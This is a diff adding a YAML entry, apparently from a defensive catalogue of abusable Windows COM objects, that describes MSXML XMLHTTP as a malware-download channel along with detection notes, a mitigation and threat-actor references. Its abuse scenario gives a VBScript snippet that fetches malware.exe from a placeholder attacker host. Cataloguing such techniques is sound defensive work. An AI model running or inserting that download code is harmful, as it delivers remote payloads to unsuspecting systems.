@@ -1,0 +1,51 @@
+name: MSXML.XMLHTTP.6.0 COM Object
+category: windows-com-api
+subcategory: network-communication
+api:
+  namespace: MSXML.XMLHTTP
+  language: VBScript/JavaScript/PowerShell
+  documentation: https://learn.microsoft.com/en-us/windows/win32/xml/msxml-3-0
+  object: MSXML.XMLHTTP.6.0
+abuse_scenarios:
+- name: Download malware via XMLHTTP
+  technique_id: T1105
+  description: Fetch remote payloads without certutil or powershell
+  code_snippet: Set xmlHttp = CreateObject("MSXML2.XMLHTTP") xmlHttp.Open "GET", "http://attacker.com/malware.exe"
+    xmlHttp.Send
+  detection_difficulty: medium
+  common_in_campaigns: true
+detection:
+- vendor: Network IDS
+  effectiveness: high
+  notes: Monitor HTTP connections from script engines
+- vendor: Proxy logs
+  effectiveness: high
+  notes: Detect suspicious download patterns
+mitigation:
+- category: policy
+  description: Restrict outbound HTTP from script engines
+  feasibility: high
+risk:
+  severity: high
+  prevalence: widespread
+  ease_of_abuse: easy
+  likelihood_in_real_attacks: 75
+references:
+  techniques:
+  - T1105
+  threat_actors:
+  - APT1
+  - FIN7
+  malware_families:
+  - Emotet
+  - IcedID
+  tools:
+  - Custom scripts
+tags:
+- windows-com-api
+- download
+- c2
+id: 983cf6d8-cfd7-4d10-a6ff-874c6c3cd954
+author: magicsword-io
+created: '2026-02-02'
+verified: true
